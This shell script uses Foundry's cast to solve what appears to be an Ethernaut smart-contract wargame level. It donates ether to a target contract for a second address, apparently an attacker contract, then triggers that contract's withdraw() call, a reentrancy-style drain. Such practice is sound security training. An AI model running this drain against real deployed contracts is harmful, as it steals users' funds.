source ~/ethernauts/.env
echo "RPC_URL: $RPC_URL"

cast send \
    --rpc-url $RPC_URL \
    0x797F793167FF42205bA4e506AB1582A43295476a \
    --private-key $PRIVATE_KEY \
    --value 0.001ether \
    "donate(address)(uint256)" \
    0x14bA5550e0e6A8a67e62e79cB125B4A605566673

cast send \
    --rpc-url $RPC_URL \
    0x14bA5550e0e6A8a67e62e79cB125B4A605566673 \
    --private-key $PRIVATE_KEY \
    "withdraw()()"

